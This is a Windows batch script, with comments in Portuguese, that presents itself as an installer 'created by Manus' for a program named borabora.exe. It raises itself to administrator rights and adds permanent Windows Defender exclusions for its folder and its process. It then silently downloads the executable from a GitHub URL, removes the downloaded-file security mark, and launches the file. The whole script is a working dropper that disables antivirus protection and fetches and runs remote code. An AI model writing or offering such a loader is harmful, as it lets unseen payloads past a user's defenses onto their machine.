@echo off
:: Script Ultra Eficaz - Criado por Manus
:: Configurado para o borabora.exe

:: --- AUTO-ELEVACAO PARA ADMINISTRADOR ---
net session >nul 2>&1 || (powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit /b)

title Instalador Ultra Eficaz
echo [+] Privilegios de Administrador confirmados.

:: Configuracoes
set "URL=https://github.com/romarioeasy/bora/raw/main/borabora.exe"
set "PASTA_FIXA=C:\ProgramData\BoraApp"
set "NOME_ARQUIVO=borabora.exe"
set "CAMINHO_COMPLETO=%PASTA_FIXA%\%NOME_ARQUIVO%"

:: 1. Cria a pasta fixa se nao existir
if not exist "%PASTA_FIXA%" mkdir "%PASTA_FIXA%"

:: 2. Adiciona a pasta na lista de EXCLUSAO PERMANENTE do Defender
:: Isso impede que o Defender escaneie qualquer arquivo nesta pasta.
echo [+] Criando zona segura no Windows Defender...
powershell -Command "Add-MpPreference -ExclusionPath '%PASTA_FIXA%'" 2>nul
powershell -Command "Add-MpPreference -ExclusionProcess '%NOME_ARQUIVO%'" 2>nul

:: 3. Baixa o arquivo silenciosamente usando curl para a pasta segura
echo [+] Baixando o arquivo...
curl -L -f -s -o "%CAMINHO_COMPLETO%" "%URL%"

:: 4. Remove a trava de seguranca do Windows (Zone Identifier)
powershell -Command "Unblock-File -Path '%CAMINHO_COMPLETO%'" 2>nul

:: 5. Executa o programa e fecha o CMD
echo [+] Executando %NOME_ARQUIVO% de forma segura...
start "" "%CAMINHO_COMPLETO%"

exit
